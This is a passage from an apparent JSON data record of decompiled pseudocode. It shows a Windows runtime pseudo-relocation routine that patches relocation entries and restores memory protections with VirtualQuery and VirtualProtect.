puStack272;\n    fcn.0040a1a0(\"  VirtualQuery failed for %d bytes at address %p\", 0x30, puStack272, arg4_00);\n    if (*0x434350 != 0) {\n        return;\n    }\n    *0x434350 = 1;\n    auStack384[0] = 0x40a47f;\n    iStack256 = unaff_R12;\n    puStack248 = unaff_R13;\n    puStack240 = unaff_R14;\n    puStack232 = puVar18;\n    fcn.0040adc0();\n    auStack384[0] = 0x40a496;\n    iVar5 = fcn.0040b810(pcVar8);\n    piVar13 = 0x4300a0;\n    *0x434354 = 0;\n    iVar5 = -iVar5;\n    *0x434358 = auStack344 + iVar5;\n    if ((*0x4300a0 == 0) && (*0x4300a4 == 0)) {\n        arg4_00 = *0x4300a8;\n        if (*0x4300a8 == 0) {\n            piVar13 = 0x4300ac;\n            puVar7 = *0x4300ac;\n            if ((*0x4300ac != 0) || (*0x4300b0 != 0)) goto code_r0x0040a630;\n        }\n        uVar9 = piVar13[2];\n        if (piVar13[2] != 1) {\ncode_r0x0040a74d:\n            *(auStack384 + iVar5) = 0x40a759;\n            fcn.0040a1a0(\"  Unknown pseudo relocation protocol version %d.\\n\", uVar9, puVar7, arg4_00);\n            return;\n        }\n        puVar14 = piVar13 + 3;\n        if (0x4300b7 < puVar14) {\n            *0x434354 = 0;\n            return;\n        }\n        do {\n            uVar1 = *(puVar14 + 2);\n            arg3_01 = *puVar14 + 0x400000;\n            pcVar8 = puVar14[1] + 0x400000;\n            uVar9 = *arg3_01;\n            if (uVar1 == 0x10) {\n                arg4_00 = *pcVar8;\n                puVar7 = arg4_00;\n                if (*pcVar8 < 0) {\n                    puVar7 = arg4_00 | 0xffffffffffff0000;\n                }\n                apuStack328[0] = puVar7 + (uVar9 - arg3_01);\n                *(auStack384 + iVar5) = 0x40a6e1;\n                fcn.0040a210(pcVar8, apuStack328, 2);\n            }\n            else {\n                uVar10 = uVar1;\n                if (uVar1 < 0x11) {\n                    if (uVar10 != 8) {\ncode_r0x0040a6e6:\n                        pcVar8 = \"  Unknown pseudo relocation bit size %d.\\n\";\n                        uVar9 = uVar10;\n                        apuStack328[0] = NULL;\n                        *(auStack384 + iVar5) = 0x40a6fc;\n                        fcn.0040a1a0(\"  Unknown pseudo relocation bit size %d.\\n\", uVar9, arg3_01, arg4_00);\n                        goto code_r0x0040a6fc;\n                    }\n                    arg4_00 = *pcVar8;\n                    puVar7 = arg4_00;\n                    if (*pcVar8 < '\\0') {\n                        puVar7 = arg4_00 | 0xffffffffffffff00;\n                    }\n                    apuStack328[0] = puVar7 + (uVar9 - arg3_01);\n                    *(auStack384 + iVar5) = 0x40a6a7;\n                    fcn.0040a210(pcVar8, apuStack328, 1);\n                }\n                else if (uVar10 == 0x20) {\ncode_r0x0040a6fc:\n                    arg4_00 = *pcVar8;\n                    puVar7 = arg4_00;\n                    if (*pcVar8 < 0) {\n                        puVar7 = arg4_00 | 0xffffffff00000000;\n                    }\n                    apuStack328[0] = puVar7 + (uVar9 - arg3_01);\n                    *(auStack384 + iVar5) = 0x40a72a;\n                    fcn.0040a210(pcVar8, apuStack328, 4);\n                }\n                else {\n                    if (uVar10 != 0x40) goto code_r0x0040a6e6;\n                    apuStack328[0] = (uVar9 - arg3_01) + *pcVar8;\n                    *(auStack384 + iVar5) = 0x40a596;\n                    fcn.0040a210(pcVar8, apuStack328, 8);\n                }\n            }\n            puVar14 = puVar14 + 3;\n        } while (puVar14 < 0x4300b8);\n    }\n    else {\ncode_r0x0040a630:\n        if (0x4300b7 < piVar13) {\n            *0x434354 = 0;\n            return;\n        }\n        do {\n            uVar10 = piVar13[1];\n            piVar16 = piVar13 + 2;\n            apuStack328[0] = apuStack328[0] & 0xffffffff00000000 | *(uVar10 + 0x400000) + *piVar13;\n            *(auStack384 + iVar5) = 0x40a664;\n            fcn.0040a210(uVar10 + 0x400000, apuStack328, 4);\n            piVar13 = piVar16;\n        } while (piVar16 < 0x4300b8);\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_VirtualQuery;\n    pcVar12 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar15 = 0;\n    iVar17 = 0;\n    if (0 < *0x434354) {\n        do {\n            if (*(*0x434358 + iVar15) != 0) {\n                uVar3 = *(*0x434358 + iVar15 + 8);\n                *(auStack384 + iVar5) = 0x40a603;\n                iVar6 = (*pcVar4)(uVar3, apuStack328, 0x30);\n                uVar3 = uStack304;\n                puVar7 = apuStack328[0];\n                if (iVar6 == 0) {\n                    puVar7 = *(*0x434358 + iVar15 + 8);\n                    uVar9 = *(*(*0x434358 + iVar15 + 0x10) + 8);\n                    *(auStack384 + iVar5) = 0x40a74d;\n                    fcn.0040a1a0(\"  VirtualQuery failed for %d bytes at address %p\", uVar9, puVar7, arg4_00);\n                    goto code_r0x0040a74d;\n                }\n                uVar2 = *(*0x434358 + iVar15);\n                *(auStack384 + iVar5) = 0x40a625;\n                arg4_00 = auStack332;\n                (*pcVar12)(puVar7, uVar3, uVar2);\n            }\n            iVar17 = iVar17 + 1;\n            iVar15 = iVar15 + 0x18;\n        } while (iVar17 < *0x434354);\n    }\n    return;\n}\n",
        "token_count": 3453
    }
}